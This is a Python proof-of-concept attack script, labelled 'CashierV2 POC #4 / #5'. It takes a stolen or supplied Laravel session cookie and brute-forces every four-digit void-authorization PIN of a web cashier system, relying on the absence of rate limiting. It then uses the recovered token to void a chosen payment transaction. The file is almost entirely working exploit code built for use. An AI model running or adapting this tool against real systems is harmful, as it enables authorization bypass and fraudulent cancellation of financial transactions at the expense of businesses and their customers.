import sys
import json
import time
import asyncio
import aiohttp
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

# ── banner ────────────────────────────────────────────────────────────────────

def _build_banner():
    title_lines_raw = [
        " ____  ___ _   _  ____ ____      _    ____ _  __",
        "|  _ \\|_ _| \\ | |/ ___|  _ \\    / \\  / ___| |/ /",
        "| |_) || ||  \\| | |   | |_) |  / _ \\| |   | ' / ",
        "|  __/ | || |\\  | |___|  _ <  / ___ \\ |___| . \\ ",
        "|_|   |___|_| \\_|\\____|_| \\_\\/_/   \\_\\____|_|\\_\\",
    ]
    title_lines = [f"{YELLOW}{l}{RESET}" for l in title_lines_raw]

    art = [
        f"  {DIM}┌──────────────┐{RESET}",
        f"  {DIM}│{RESET} {YELLOW}PIN: {RED}????{RESET}        {DIM}│{RESET}",
        f"  {DIM}│{RESET} {DIM}0000→9999{RESET}     {DIM}│{RESET}",
        f"  {DIM}│{RESET} {GREEN}→ void bypass{RESET}  {DIM}│{RESET}",
        f"  {DIM}└──────────────┘{RESET}",
    ]

    T = max(len(l) for l in title_lines_raw)
    top_pad    = [""] * 2
    bot_pad    = [""] * 2
    left_lines = top_pad + [f"{l}{' ' * (T - len(r))}" for l, r in zip(title_lines, title_lines_raw)] + bot_pad
    right_lines = [""] * 2 + art + [""] * 1

    out = ["\n"]
    for l, r in zip(left_lines, right_lines):
        out.append(f"  {l}   {r}")
    out.append(f"\n  {DIM}  cashier void PIN bruteforce  ·  CashierV2 POC #4 / #5{RESET}\n")
    return "\n".join(out)

print(_build_banner())

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL       = input(f"  {CYAN}[?]{RESET} Target URL             : ").strip().rstrip("/")
    SESSION_COOKIE = input(f"  {CYAN}[?]{RESET} laravel_session        : ").strip()
    MAX_CONC       = int(input(f"  {CYAN}[?]{RESET} Concurrency [50]      : ").strip() or "50")
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

HDRS = {
    "Cookie": f"laravel_session={SESSION_COOKIE}",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
}

# ── step 1: get pin_id from check-permission ──────────────────────────────────

import requests as _req

def get_pin_info():
    print(f"\n  {DIM}[>]{RESET} GET /cashier/void/check-permission")
    try:
        r = _req.get(
            f"{BASE_URL}/cashier/void/check-permission",
            headers={"Cookie": f"laravel_session={SESSION_COOKIE}"},
            timeout=8
        )
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        data = r.json()
        print(f"  {DIM}    Response: {RESET}{json.dumps(data)[:300]}")
        return data
    except Exception as e:
        print(f"  {RED}[!]{RESET} {e}")
        return None

# ── step 2: async brute-force ─────────────────────────────────────────────────

found_pin   = None
found_token = None

async def try_pin(session, sem, pin_id, trans_id, pin_str, pbar):
    global found_pin, found_token
    async with sem:
        if found_pin:
            pbar.update(1)
            return
        payload = json.dumps({"pin": pin_str, "pin_id": pin_id, "chrngtransid": trans_id})
        try:
            async with session.post(
                f"{BASE_URL}/cashier/void/verify-pin",
                data=payload,
                timeout=aiohttp.ClientTimeout(total=6)
            ) as resp:
                text = await resp.text()
                pbar.update(1)
                try:
                    data = json.loads(text)
                    if data.get("ok") or data.get("status") == 1 or data.get("success"):
                        found_pin   = pin_str
                        found_token = data.get("token") or data.get("auth_token")
                        tqdm.write(f"\n  {GREEN}[✓] PIN FOUND: {BOLD}{pin_str}{RESET}  token={found_token}")
                except Exception:
                    pass
        except Exception:
            pbar.update(1)

async def brute(pin_id, trans_id):
    sem = asyncio.Semaphore(MAX_CONC)
    cookies = {"laravel_session": SESSION_COOKIE}
    async with aiohttp.ClientSession(headers=HDRS, cookies=cookies) as session:
        with tqdm(total=10000, desc=f"  {YELLOW}cracking{RESET}", unit="pin",
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]") as pbar:
            tasks = []
            for i in range(10000):
                pin_str = f"{i:04d}"
                tasks.append(asyncio.create_task(try_pin(session, sem, pin_id, trans_id, pin_str, pbar)))
            await asyncio.gather(*tasks, return_exceptions=True)

# ── step 3: void transaction ──────────────────────────────────────────────────

def do_void(trans_id, auth_token):
    print(f"\n  {DIM}[>]{RESET} POST /cashier/void  (transid={trans_id})")
    payload = {"chrngtransid": trans_id, "auth_token": auth_token, "remarks": "void"}
    try:
        r = _req.post(
            f"{BASE_URL}/cashier/void",
            json=payload,
            headers={"Cookie": f"laravel_session={SESSION_COOKIE}", "Content-Type": "application/json"},
            timeout=8
        )
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        print(f"  {DIM}    {r.text[:300]}{RESET}")
    except Exception as e:
        print(f"  {RED}[!]{RESET} {e}")

# ── main ──────────────────────────────────────────────────────────────────────

print(f"\n  {DIM}Step 1 — Gather PIN ID from check-permission{RESET}")
pin_info = get_pin_info()

pin_id = None
if pin_info:
    pin_id = pin_info.get("pin_id") or pin_info.get("id")
    print(f"  {GREEN}[+]{RESET} pin_id = {YELLOW}{pin_id}{RESET}")
    auth_mode = pin_info.get("status_id")
    print(f"  {DIM}    auth mode: {auth_mode} (1=credentials, 2=PIN){RESET}")

if not pin_id:
    try:
        pin_id = int(input(f"\n  {CYAN}[?]{RESET} Enter pin_id manually: ").strip())
    except (KeyboardInterrupt, ValueError):
        print(f"\n  {RED}[!]{RESET} No pin_id — cannot crack.")
        sys.exit(1)

try:
    trans_id = int(input(f"\n  {CYAN}[?]{RESET} Target transaction ID (chrngtransid): ").strip() or "1")
    go = input(f"  {CYAN}[?]{RESET} Start brute force? [Y/n]: ").strip().lower()
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    sys.exit(0)

if go == "n":
    sys.exit(0)

print(f"\n  {DIM}Step 2 — Brute forcing 0000-9999 (no rate limit){RESET}\n")
start = time.time()
try:
    asyncio.run(brute(pin_id, trans_id))
except KeyboardInterrupt:
    print(f"\n  {YELLOW}[!]{RESET} Interrupted.")

elapsed = time.time() - start
print(f"\n  {DIM}Finished in {elapsed:.1f}s{RESET}")

if found_pin:
    print(f"\n  {GREEN}[✓]{RESET} Cracked PIN: {BOLD}{YELLOW}{found_pin}{RESET}")
    if found_token:
        print(f"  {GREEN}[+]{RESET} Auth token:  {CYAN}{found_token}{RESET}")
        try:
            do_void_yn = input(f"\n  {CYAN}[?]{RESET} Use token to void transaction {trans_id}? [Y/n]: ").strip().lower()
        except KeyboardInterrupt:
            do_void_yn = "n"
        if do_void_yn != "n":
            do_void(trans_id, found_token)
    else:
        print(f"  {YELLOW}[!]{RESET} No token in response — use PIN manually.")
else:
    print(f"\n  {RED}[✗]{RESET} PIN not found in 0000-9999 range.")
